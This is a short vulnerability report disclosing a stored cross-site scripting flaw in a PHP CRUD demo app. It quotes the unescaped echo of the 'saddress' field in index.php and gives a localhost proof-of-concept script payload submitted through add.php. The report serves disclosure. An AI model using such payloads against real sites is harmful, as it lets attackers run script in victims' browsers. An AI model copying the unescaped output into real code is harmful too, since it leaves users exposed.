# Crud Operation System has Based Cross Site Scripting vulnerability in index.php

## supplier 
https://code-projects.org/crud-operation-system-in-php-with-source-code/
## Vulnerability file
index.php and saddress parameter.

## describe
There are unrestricted cross site scripting attacks and injection attacks in the Crud Operation System. The controllable parameters are as follows: saddress. This function will execute the saddress parameter without restriction into the echo statement. Malicious attackers can exploit this vulnerability to obtain sensitive information from clients

**Code analysis**

Querying data from the database and storing it in the $row [] array, and the echo $row ['saddress'] is not filtered, resulting in the execution of XSS statements.

```
                <td><?php echo $row['saddress']; ?></td>
```

![image-20241124165455744](xss12(未交).assets/image-20241124165455744.png)

## POC

asset add.php

```
http://localhost/crud/add.php
```

insert saddress parameter into database.

```
"/><script>alert(111);</script>
```

![image-20241124170005628](xss12(未交).assets/image-20241124170005628.png)

Visit this URL to trigger the cross-site scripting vulnerability.

```
http://localhost/crud/index.php
```

**Result**

![image-20241124170033260](xss12(未交).assets/image-20241124170033260.png)

 